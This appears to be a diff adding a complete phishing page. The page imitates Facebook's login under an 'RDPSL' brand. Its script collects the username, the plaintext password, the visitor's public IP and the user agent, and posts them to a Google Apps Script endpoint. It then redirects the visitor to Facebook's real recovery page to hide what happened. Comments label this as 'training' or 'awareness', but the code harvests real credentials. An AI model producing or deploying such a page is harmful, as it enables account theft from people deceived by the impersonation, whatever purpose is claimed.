@@ -1,0 +1,341 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>RDPSL Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<style>
+  /* Layout: logo-first, stacked form centered on a plain white page, no card — fills width on phones */
+  /* Single committed light look: the page stays white regardless of the viewer's theme */
+  :root {
+    --bg: #ffffff;
+    --fg: #1c1e21;
+    --muted: #606770;
+    --field-bg: #ffffff;
+    --field-border: #cccfd4;
+    --field-focus: #1877F2;
+    --accent: #1877F2;
+    --accent-hover: #166fe5;
+    --accent-active: #1464d4;
+    --divider: #e4e6eb;
+    --link: #1877F2;
+    --radius: 10px;
+    --font: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    color-scheme: light;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { height: 100%; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--font);
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100%;
+    padding-block: 32px;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+  }
+
+  .shell {
+    width: 100%;
+    max-width: 396px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+  }
+
+  .brand {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+  }
+  .brand img {
+    width: 76px;
+    height: 76px;
+    object-fit: contain;
+    display: block;
+  }
+  .brand .wordmark {
+    font-size: 1.5rem;
+    font-weight: 800;
+    letter-spacing: 0.14em;
+    color: var(--accent);
+  }
+
+  .card {
+    width: 100%;
+    background: var(--bg);
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .card h1 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    margin: 0 0 2px;
+    text-wrap: balance;
+  }
+
+  form { display: flex; flex-direction: column; gap: 12px; }
+
+  .field { position: relative; display: flex; flex-direction: column; }
+  label.sr {
+    position: absolute;
+    width: 1px; height: 1px;
+    overflow: hidden; clip: rect(0 0 0 0);
+    white-space: nowrap;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    font-family: inherit;
+    font-size: 1rem;
+    color: var(--fg);
+    background: var(--field-bg);
+    border: 1px solid var(--field-border);
+    border-radius: var(--radius);
+    padding: 14px 16px;
+  }
+  input::placeholder { color: var(--muted); }
+  input:focus {
+    outline: none;
+    border-color: var(--field-focus);
+    box-shadow: 0 0 0 2px rgba(24,119,242,0.25);
+  }
+
+  .btn-primary {
+    width: 100%;
+    font-family: inherit;
+    font-size: 1.0625rem;
+    font-weight: 700;
+    color: #fff;
+    background: var(--accent);
+    border: none;
+    border-radius: 999px;
+    padding: 13px 16px;
+    cursor: pointer;
+    transition: background-color .15s ease;
+  }
+  .btn-primary:hover { background: var(--accent-hover); }
+  .btn-primary:active { background: var(--accent-active); }
+  .btn-primary:focus-visible { outline: 3px solid rgba(24,119,242,0.4); outline-offset: 2px; }
+
+  .forgot {
+    text-align: center;
+    margin: 2px 0 0;
+  }
+  .forgot a, .footer-links a, .create a { color: var(--link); text-decoration: none; }
+  .forgot a { font-size: .9375rem; font-weight: 600; }
+  .forgot a:hover, .footer-links a:hover, .create a:hover { text-decoration: underline; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--divider);
+    margin: 6px 0 2px;
+  }
+
+  .create { display: flex; justify-content: center; }
+  .btn-secondary {
+    width: 100%;
+    font-family: inherit;
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--accent);
+    background: transparent;
+    border: 1px solid var(--accent);
+    border-radius: 999px;
+    padding: 13px 16px;
+    cursor: pointer;
+    transition: background-color .15s ease;
+  }
+
+  .mark {
+    display: flex;
+    justify-content: center;
+    margin-top: 6px;
+  }
+  .mark img {
+    width: 34px;
+    height: 34px;
+    object-fit: contain;
+    display: block;
+  }
+  .btn-secondary:hover { background: rgba(24,119,242,0.08); }
+  .btn-secondary:focus-visible { outline: 3px solid rgba(24,119,242,0.4); outline-offset: 2px; }
+
+  .msg {
+    font-size: .875rem;
+    text-align: center;
+    color: var(--muted);
+    min-height: 1.1em;
+  }
+
+  footer {
+    width: 100%;
+    max-width: 396px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    align-items: center;
+    color: var(--muted);
+    font-size: .8125rem;
+  }
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 4px 14px;
+  }
+  .copyright { color: var(--muted); }
+
+  @media (max-width: 420px) {
+    body { padding-block: 20px; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    * { transition: none !important; }
+  }
+</style>
+
+<div class="shell">
+  <div class="brand">
+    <img src="logo.png">
+  </div>
+
+  <div class="card">
+    <h1>Log in to Facebook</h1>
+    <form id="loginForm" novalidate>
+      <div class="field">
+        <label class="sr" for="identifier">Email address or username</label>
+        <input id="identifier" name="identifier" type="text" autocomplete="username"
+               placeholder="Email address or username" required>
+      </div>
+      <div class="field">
+        <label class="sr" for="password">Password</label>
+        <input id="password" name="password" type="password" autocomplete="current-password"
+               placeholder="Password" required>
+      </div>
+      <button class="btn-primary" type="submit">Log in</button>
+    </form>
+    <p class="forgot"><a href="https://www.facebook.com/login/identify/?ci=AdCE35GPX6J3d80QXh3JbY_ZUs6ZkiJiQKrSTQCSR4dqUQcQ0npNm8YGPEYshIAw4CWgJeSZ5ki-x8QOSHVv49yR9X_51y7a9-SkthqrlazGti7owpZdo9m361ls7fbnDDjQcPmUxgDTiaEDdcQXL7qMLprrA5y6AII4j-atFZFZ2AkL0caG-MrpRQRg4j9nKnrFimaOJP7VbaPX90wiVJ5sE3fitNXDlaR0MeYauX1Q4WX8n11GHQH9QLJagUz6ZNPnS8gwZFHfFqDgHyPhlKTfoUxK">Forgotten password?</a></p>
+    <p class="msg" id="msg" role="status" aria-live="polite"></p>
+    <hr class="divider">
+    <div class="create">
+      <button class="btn-secondary" type="button" id="createBtn">Create new account</button>
+    </div>
+    <div class="mark">
+      <img src="logo2.png" alt="RDPSL">
+    </div>
+  </div>
+
+  <footer>
+    <nav class="footer-links">
+      <a href="#" aria-current="true">English (UK)</a>
+      <a href="#">සිංහල</a>
+      <a href="#">தமிழ்</a>
+      <a href="#">Español</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Italiano</a>
+      <a href="#">Français (France)</a>
+    </nav>
+    <div class="copyright">&copy; 2026 RDPSL</div>
+  </footer>
+</div>
+
+
+<script>
+  // Google Apps Script Web App URL
+  const SHEET_URL =
+    "https://script.google.com/macros/s/AKfycbwDLcoVh5hsX0FT_HGwuLpeiuQp-X5AZ4QFdOqdtFBivIfdcMMt0XaM1q3H0jPEbJ_lFQ/exec";
+
+  const form = document.getElementById("loginForm");
+  const msg = document.getElementById("msg");
+  const createBtn = document.getElementById("createBtn");
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    // Get entered username
+    const enteredUsername = document
+      .getElementById("identifier")
+      .value
+      .trim();
+
+    if (!enteredUsername) {
+      msg.textContent = " ";
+      return;
+    }
+
+    // Check password field interaction only
+    const passwordField = document.getElementById("password").value.trim();
+
+    if (!passwordField){
+      msg.textContent = " ";
+      return;
+    }
+
+    msg.textContent = " ";
+
+    // Get public IP address
+    let publicIP = "Unavailable";
+
+    try {
+      const response = await fetch(
+        "https://api.ipify.org?format=json"
+      );
+
+      if (response.ok) {
+        const result = await response.json();
+        publicIP = result.ip || "Unavailable";
+      }
+    } catch (error) {
+      console.log("Public IP lookup unavailable.");
+    }
+
+    // Prepare training event data
+    const data = new URLSearchParams({
+      username: enteredUsername,
+      passwordInteraction: passwordField,
+      ip: publicIP,
+      userAgent: navigator.userAgent,
+      event: "Done"
+    });
+
+    // Send data to Google Sheets
+    try {
+      await fetch(SHEET_URL, {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+      });
+
+      // Redirect to internal awareness page
+      window.location.assign(
+        new URL("https://www.facebook.com/login/identify/?ci=AdBh5gIEFtKyVjhB0OH4pxG_U8VBdg4c7OWjDDiVCdjUuH4GQQ0zIveUCngZm8XDHJSsKVjzSxHysFhhrg9bijEfakQ5wY27yUgw1bH4CBG9xkP4_LEBgUEqBoSqmGUKjFqGwXaZR-bKuwRGs5icTz4T82d4D_OiJ7C1Ls0b-FRQF0spmDxBgbSyxj-tAsB0X_IgTgvHEUVrtHK-6Ziqc_0Mrfy_1HEE4MlxKwyLyOMmnpuAxQXlISZjhDSrnifmr46rMCkuOJFojWCEoc1QDG-qvaG9", window.location.href).href
+      );
+
+    } catch (error) {
+      msg.textContent =
+        "Unable to submit the data.";
+
+      console.error("Submission error:", error);
+    }
+  });
+
+  // Create Account button
+  if (createBtn) {
+    createBtn.addEventListener("click", function () {
+      window.location.assign(
+        new URL("https://www.facebook.com/login/identify/?ci=AdBh5gIEFtKyVjhB0OH4pxG_U8VBdg4c7OWjDDiVCdjUuH4GQQ0zIveUCngZm8XDHJSsKVjzSxHysFhhrg9bijEfakQ5wY27yUgw1bH4CBG9xkP4_LEBgUEqBoSqmGUKjFqGwXaZR-bKuwRGs5icTz4T82d4D_OiJ7C1Ls0b-FRQF0spmDxBgbSyxj-tAsB0X_IgTgvHEUVrtHK-6Ziqc_0Mrfy_1HEE4MlxKwyLyOMmnpuAxQXlISZjhDSrnifmr46rMCkuOJFojWCEoc1QDG-qvaG9", window.location.href).href
+      );
+    });
+  }
+</script>
+
+
+
+</body></html>
